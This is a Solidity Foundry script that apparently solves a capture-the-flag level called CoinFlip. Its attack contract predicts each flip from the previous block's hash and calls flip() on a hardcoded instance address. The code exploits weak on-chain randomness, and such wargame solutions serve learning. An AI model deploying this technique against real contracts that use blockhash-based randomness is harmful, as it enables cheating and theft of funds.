// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/Level03.sol";

contract CoinFlipAttack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _instance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _instance.flip(side);
    }
}

contract CoinFlipScript is Script {
    CoinFlip public coinFlipInstance;

    function setUp() public {
        coinFlipInstance = CoinFlip(payable(0x9264828b08c13EfBEaBb8A3fE01be127E2fDDC9C));
    }

    function run() public {
        vm.startBroadcast();

        new CoinFlipAttack(coinFlipInstance);

        vm.stopBroadcast();
    }
}
